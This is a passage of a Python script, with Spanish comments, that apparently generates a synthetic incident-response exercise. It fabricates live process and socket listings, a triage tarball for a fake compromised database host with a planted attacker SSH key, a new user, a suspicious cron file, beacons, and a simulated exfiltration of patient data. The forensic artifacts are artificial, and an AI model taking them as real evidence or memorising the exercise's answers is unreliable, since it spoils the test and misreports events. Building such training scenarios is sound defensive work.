root           4  0.0  0.0      0     0 ?        I<   Sep14   0:00  \\_ [rcu_par_gp]
root          12  0.0  0.0      0     0 ?        S    Sep14   0:41  \\_ [ksoftirqd/0]
root          13  0.0  0.0      0     0 ?        I    Sep14   2:16  \\_ [rcu_sched]
root          14  0.0  0.0      0     0 ?        S    Sep14   0:09  \\_ [migration/0]
root         386  0.0  0.0      0     0 ?        S    Sep14   0:48  \\_ [jbd2/dm-0-8]
root           1  0.0  0.2 167780 11896 ?        Ss   Sep14   1:12 /sbin/init
root         412  0.0  0.6  64316 26172 ?        S<s  Sep14   0:39 /lib/systemd/systemd-journald
root         455  0.0  0.6 289352 27108 ?        SLsl Sep14   1:58 /sbin/multipathd -d -s
root         466  0.0  0.1  25376  6324 ?        Ss   Sep14   0:02 /lib/systemd/systemd-udevd
systemd+     702  0.0  0.1  16252  7924 ?        Ss   Sep14   0:04 /lib/systemd/systemd-networkd
systemd+     731  0.0  0.3  25660 12944 ?        Ss   Sep14   0:11 /lib/systemd/systemd-resolved
systemd+     735  0.0  0.1  89356  6612 ?        Ssl  Sep14   0:03 /lib/systemd/systemd-timesyncd
message+     790  0.0  0.1   8768  4912 ?        Ss   Sep14   0:01 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         793  0.0  0.0  82832  3920 ?        Ssl  Sep14   0:26 /usr/sbin/irqbalance --foreground
root         795  0.0  0.4  32752 19312 ?        Ss   Sep14   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         798  0.0  0.1  15428  7380 ?        Ss   Sep14   0:03 /lib/systemd/systemd-logind
syslog       804  0.0  0.1 222404  5940 ?        Ssl  Sep14   0:09 /usr/sbin/rsyslogd -n -iNONE
root         812  0.0  0.0   7192  2740 ?        Ss   Sep14   0:05 /usr/sbin/cron -f -P
daemon       815  0.0  0.0   3864  1236 ?        Ss   Sep14   0:00 /usr/sbin/atd -f
root         840  0.0  0.5 109748 21520 ?        Ssl  Sep14   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root        1021  0.0  0.1  15436  9112 ?        Ss   Sep14   0:31 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root      {sp:>6}  0.0  0.2  17184 10992 ?        Ss   08:04   0:00  \\_ sshd: mvega [priv]
mvega     {sp + 98:>6}  0.0  0.1  17316  7920 ?        S    08:04   0:00      \\_ sshd: mvega@pts/0
mvega     {sp + 99:>6}  0.0  0.1   8792  5520 pts/0    Ss   08:04   0:00          \\_ -bash
root      {LIVE['sudo_pid']:>6}  0.0  0.1  11496  5632 pts/0    S+   08:27   0:00              \\_ sudo /bin/bash /tmp/ir-collect.sh
root      {LIVE['sudo_pid'] + 1:>6}  0.0  0.0  11496   888 pts/1    Ss   08:27   0:00                  \\_ sudo /bin/bash /tmp/ir-collect.sh
root      {LIVE['sudo_pid'] + 2:>6}  0.0  0.0   7372  3540 pts/1    S+   08:27   0:00                      \\_ /bin/bash /tmp/ir-collect.sh
root      {LIVE['sudo_pid'] + 9:>6}  0.0  0.0  10072  1584 pts/1    R+   08:28   0:00                          \\_ ps auxf
root        1030  0.0  0.0   6176  1088 tty1     Ss+  Sep14   0:00 /sbin/agetty -o -p -- \\u --noclear tty1 linux
mysql       1187  0.4 18.7 4117932 755140 ?      Ssl  Sep14 102:44 /usr/sbin/mariadbd
mvega     {sp + 83:>6}  0.0  0.2  17096  9632 ?        Ss   08:04   0:00 /lib/systemd/systemd --user
mvega     {sp + 84:>6}  0.0  0.0 169732  3644 ?        S    08:04   0:00  \\_ (sd-pam)
"""
    ss = f"""State  Recv-Q Send-Q    Local Address:Port      Peer Address:Port Process
LISTEN 0      4096      127.0.0.53%lo:53             0.0.0.0:*     users:(("systemd-resolve",pid=731,fd=14))
LISTEN 0      128             0.0.0.0:22             0.0.0.0:*     users:(("sshd",pid=1021,fd=3))
LISTEN 0      80          10.20.30.20:3306           0.0.0.0:*     users:(("mariadbd",pid=1187,fd=21))
ESTAB  0      0           10.20.30.20:22         10.20.30.55:50877 users:(("sshd",pid={sp + 98},fd=4),("sshd",pid={sp},fd=4))
ESTAB  0      0           10.20.30.20:3306       10.20.30.10:47316 users:(("mariadbd",pid=1187,fd=34))
LISTEN 0      128                [::]:22                [::]:*     users:(("sshd",pid=1021,fd=4))
"""
    who = "mvega    pts/0        2026-09-30 08:04 (10.20.30.55)\n"
    date = "Wed Sep 30 08:28:12 UTC 2026\n 08:28:12 up 16 days,  5:15,  1 user,  load average: 0.08, 0.05, 0.01\n"
    return {"live/date.txt": date, "live/who.txt": who, "live/ps-auxf.txt": ps, "live/ss-tanp.txt": ss,
            "live/ls-tmpdirs.txt": ls, "live/stat.txt": "\n".join(st)}

LIVE = {}

# ======================================================================= 10. empaquetado del triage
def triage(sql_mtime):
    inst = datetime(2025, 8, 4, 10, 2, 18, tzinfo=timezone.utc).timestamp()
    old = lambda y, mo, d, h=10, mi=0: datetime(y, mo, d, h, mi, tzinfo=timezone.utc).timestamp()
    auth_txt = unpid("\n".join(l for t, l in sorted(AUTH, key=lambda e: e[0]) if T(27, 0, 0) <= t <= TRIAGE_T - 5) + "\n")
    sys_sorted = [(t, unpid(l)) for t, l in sorted(SYSLOG, key=lambda e: e[0])]
    syslog1 = "\n".join(l for t, l in sys_sorted if T(29, 0, 0) <= t < T(30, 0, 0)) + "\n"
    syslog0 = "\n".join(l for t, l in sys_sorted if T(30, 0, 0) <= t <= TRIAGE_T - 5) + "\n"
    wtmp = b"".join(utmp_pack(*r) for t, r in sorted(WTMP, key=lambda e: e[0]))
    btmp = b"".join(utmp_pack(*r) for t, r in sorted(BTMP, key=lambda e: e[0]))
    last_auth = max(t for t, _ in AUTH if t <= TRIAGE_T - 5)
    last_sys = max(t for t, _ in SYSLOG if t <= TRIAGE_T - 5)
    skel = {".bash_logout": "# ~/.bash_logout: executed by bash(1) when login shell exits.\n\n# when leaving the console clear the screen to increase privacy\n\n"
                            "if [ \"$SHLVL\" = 1 ]; then\n    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q\nfi\n",
            ".profile": "# ~/.profile: executed by the command interpreter for login shells.\n# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login\n"
                        "# exists.\n\n# if running bash\nif [ -n \"$BASH_VERSION\" ]; then\n    # include .bashrc if it exists\n"
                        "    if [ -f \"$HOME/.bashrc\" ]; then\n\t. \"$HOME/.bashrc\"\n    fi\nfi\n\n"
                        "# set PATH so it includes user's private bin if it exists\nif [ -d \"$HOME/bin\" ] ; then\n    PATH=\"$HOME/bin:$PATH\"\nfi\n",
            ".bashrc": "# ~/.bashrc: executed by bash(1) for non-login shells.\n\n# If not running interactively, don't do anything\ncase $- in\n"
                       "    *i*) ;;\n      *) return;;\nesac\n\n# don't put duplicate lines or lines starting with space in the history.\n"
                       "HISTCONTROL=ignoreboth\n\n# append to the history file, don't overwrite it\nshopt -s histappend\n\n"
                       "HISTSIZE=1000\nHISTFILESIZE=2000\n\nshopt -s checkwinsize\n\nalias ls='ls --color=auto'\nalias ll='ls -alF'\n"
                       "alias la='ls -A'\nalias l='ls -CF'\n\nif [ -f ~/.bash_aliases ]; then\n    . ~/.bash_aliases\nfi\n"}
    hist_mtime = {"root": T(30, 2, 7, 2.1), "mvega": T(29, 22, 17, 48.2), "portal_app": T(30, 1, 27, 3.0), "jnavarro": old(2026, 6, 27, 12, 39)}
    # ruta -> (contenido, mtime, modo, uid, gid, uname, gname)
    F = {
        "etc/hostname": (b"db01\n", inst, 0o644, 0, 0, "root", "root"),
        "etc/os-release": (OS_RELEASE.encode(), old(2024, 9, 11), 0o644, 0, 0, "root", "root"),
        "etc/passwd": (passwd_file(True).encode(), T(30, 1, 15, 2.1), 0o644, 0, 0, "root", "root"),
        "etc/shadow": (shadow_file().encode(), FILE_TIMES["shadow"], 0o640, 0, 42, "root", "shadow"),
        "etc/group": (group_file().encode(), T(30, 1, 15, 2.1), 0o644, 0, 0, "root", "root"),
        "etc/gshadow": (group_file(True).encode(), T(30, 1, 15, 2.1), 0o640, 0, 42, "root", "shadow"),
        "etc/sudoers": (SUDOERS.encode(), old(2024, 1, 31, 18, 22), 0o440, 0, 0, "root", "root"),
        "etc/sudoers.d/README": (SUDOERS_README.encode(), old(2022, 2, 8, 9, 2), 0o440, 0, 0, "root", "root"),
        "etc/sudoers.d/portal_app": (SUDOERS_PORTAL.encode(), old(2026, 8, 12, 9, 41) + 7.4, 0o440, 0, 0, "root", "root"),
        "etc/crontab": (CRONTAB.encode(), old(2022, 3, 23, 13, 48), 0o644, 0, 0, "root", "root"),
        "etc/cron.d/e2scrub_all": (CRON_D["e2scrub_all"].encode(), old(2022, 2, 10, 17, 40), 0o644, 0, 0, "root", "root"),
        "etc/cron.d/sysstat": (CRON_D["sysstat"].encode(), old(2023, 11, 28, 11, 4), 0o644, 0, 0, "root", "root"),
        "etc/cron.d/db-backup": (CRON_D["db-backup"].encode(), old(2025, 8, 14, 16, 12) + 31, 0o644, 0, 0, "root", "root"),
        "etc/cron.d/mariadb-health": (CRON_D["mariadb-health"].encode(), T(30, 1, 17, 40.1), 0o644, 0, 0, "root", "root"),
        "etc/ssh/sshd_config": (SSHD_CONFIG.encode(), old(2025, 8, 12, 9, 19) + 48, 0o644, 0, 0, "root", "root"),
        "etc/bash.bashrc": (BASH_BASHRC.encode(), old(2025, 8, 6, 11, 3), 0o644, 0, 0, "root", "root"),
        "etc/mysql/mariadb.conf.d/50-server.cnf": (MARIADB_50.encode(), old(2025, 8, 4, 11, 27), 0o644, 0, 0, "root", "root"),
        "usr/local/bin/db-backup.sh": (DB_BACKUP_SH.encode(), old(2025, 8, 14, 16, 9) + 12, 0o755, 0, 0, "root", "root"),
        "root/.bash_history": (bash_history(HIST["root"]), hist_mtime["root"], 0o600, 0, 0, "root", "root"),
        "root/.viminfo": (viminfo(), VIMINFO["quit"] + 0.05, 0o600, 0, 0, "root", "root"),
        "root/.ssh/authorized_keys": ((pubkey_line(KEY_ATTACKER, "ops@kelbrook-backup") + "\n").encode(), T(30, 1, 16, 20.0), 0o600, 0, 0, "root", "root"),
        "home/mvega/.bash_history": (bash_history(HIST["mvega"]), hist_mtime["mvega"], 0o600, 1001, 1001, "mvega", "mvega"),
        "home/mvega/.ssh/authorized_keys": ((pubkey_line(KEY_MVEGA, "eddsa-key-20250806") + "\n").encode(), old(2025, 8, 6, 10, 48), 0o600, 1001, 1001, "mvega", "mvega"),
        "home/portal_app/.bash_history": (bash_history(HIST["portal_app"]), hist_mtime["portal_app"], 0o600, 1002, 1002, "portal_app", "portal_app"),
        "home/jnavarro/.bash_history": (bash_history(HIST["jnavarro"]), hist_mtime["jnavarro"], 0o600, 1003, 1003, "jnavarro", "jnavarro"),
        "var/log/auth.log": (auth_txt.encode(), last_auth, 0o640, 107, 4, "syslog", "adm"),
        "var/log/syslog.1": (syslog1.encode(), T(29, 23, 59, 1.6), 0o640, 107, 4, "syslog", "adm"),
        "var/log/syslog": (syslog0.encode(), last_sys, 0o640, 107, 4, "syslog", "adm"),
        "var/log/wtmp": (wtmp, T(30, 8, 4, 37.3), 0o664, 0, 43, "root", "utmp"),
        "var/log/btmp": (btmp, max(t for t, _ in BTMP), 0o660, 0, 43, "root", "utmp"),
        "var/log/lastlog": (lastlog_file(), T(30, 8, 4, 37.3), 0o664, 0, 43, "root", "utmp"),
    }
    for name in (".bash_logout", ".profile", ".bashrc"):
        F[f"home/support/{name}"] = (skel[name].encode(), SKEL_MTIME, 0o644, 1004, 1004, "support", "support")
    LIVE["sudo_pid"] = 81712
    live = live_outputs({k: (v[0], v[1]) for k, v in F.items()})
    dirs = {"etc/cron.d": T(30, 1, 17, 40.1), "etc/sudoers.d": old(2026, 8, 12, 9, 41) + 7.4, "root/.ssh": T(30, 1, 16, 20.0),
            "home/support": T(30, 1, 15, 2.1), "home": T(30, 1, 15, 2.1), "var/tmp": T(30, 1, 25, 30.2), "var/spool/cron/crontabs": inst}
    prefix = "db01-triage-2026-09-30/"
    manifest = []
    out = io.BytesIO()
    with tarfile.open(fileobj=out, mode="w", format=tarfile.GNU_FORMAT) as tf:
        def add(name, data, mtime, mode, uid, gid, un, gn, isdir=False):
            ti = tarfile.TarInfo(prefix + name)
            ti.mtime, ti.mode, ti.uid, ti.gid, ti.uname, ti.gname = int(mtime), mode, uid, gid, un, gn
            if isdir:
                ti.type = tarfile.DIRTYPE
                tf.addfile(ti)
            else:
                ti.size = len(data)
                tf.addfile(ti, io.BytesIO(data))
                manifest.append(f"{hashlib.sha256(data).hexdigest()}  {name}")
        for d_, m in sorted(dirs.items()):
            mode = {"var/tmp": 0o1777, "root/.ssh": 0o700, "home/support": 0o750, "etc/sudoers.d": 0o750, "var/spool/cron/crontabs": 0o1730}.get(d_, 0o755)
            uid_, gid_, un, gn = (1004, 1004, "support", "support") if d_ == "home/support" else (0, 112 if "crontabs" in d_ else 0, "root", "crontab" if "crontabs" in d_ else "root")
            add("fs/" + d_, None, m, mode, uid_, gid_, un, gn, isdir=True)
        for name in sorted(F):
            data, mtime, mode, uid_, gid_, un, gn = F[name]
            add("fs/" + name, data, mtime, mode, uid_, gid_, un, gn)
        for name in sorted(live):
            add(name, live[name].encode(), TRIAGE_T + 3, 0o644, 0, 0, "root", "root")
        add("manifest.sha256", ("\n".join(manifest) + "\n").encode(), TRIAGE_T + 29, 0o644, 0, 0, "root", "root")
    return gzip.compress(out.getvalue(), compresslevel=6, mtime=int(TRIAGE_T + 30)), F

# ======================================================================= main
def main():
    sql = build_dump()
    sql_mtime = T(30, 1, 21, 0.4)
    EXFIL["tgz"] = build_exfil_tgz(sql, sql_mtime)
    prior_history()
    background_cron()
    background_scanners()
    legit_logins()
    intrusion()
    network_noise()
    old_static_history()

    os.makedirs(os.path.join(BASE, "captura"), exist_ok=True)
    os.makedirs(os.path.join(BASE, "triage"), exist_ok=True)
    PKTS.sort(key=lambda p: float(p.time))
    wrpcap(os.path.join(BASE, "captura", "vlan-datos-2026-09-29.pcap"), PKTS)
    resolve_pids()
    tgz, F = triage(sql_mtime)
    with open(os.path.join(BASE, "triage", "db01-triage-2026-09-30.tar.gz"), "wb") as f:
        f.write(tgz)

    fails_att = sum(1 for _, l in AUTH if "Failed password" in l and ATTACKER in l)
    print(f"paquetes en la captura      {len(PKTS)}")
    print(f"líneas auth.log             {len(F['var/log/auth.log'][0].splitlines())}")
    print(f"intentos {SCANNER}     {SCAN_COUNT[SCANNER]}")
    print(f"fallos del atacante         {fails_att}")
    print(f"registros btmp / wtmp       {len(BTMP)} / {len(WTMP)}")
    print(f"beacons en captura          {sum(1 for b in BEACONS if b <= CAP_END)} (total hasta triage {len(BEACONS)})")
    print(f"primer beacon               {dt(BEACONS[0])}")
    print(f"tgz exfiltrado              {len(EXFIL['tgz'])} bytes, sha256 {hashlib.sha256(EXFIL['tgz']).hexdigest()}")
    print(f"Content-Length del POST     {EXFIL['content_length']}")
    print(f"kb_clinica.sql              {len(sql)} bytes, {N_PACIENTES} pacientes")
    print(f"backup 29/09 a nas01        {BACKUP_BYTES.get('2026-09-29')} bytes")
    print(f"huella clave atacante       {fingerprint(KEY_ATTACKER)}")
    print(f"huella clave mvega          {fingerprint(KEY_MVEGA)}")

if __name__ == "__main__":
    main()
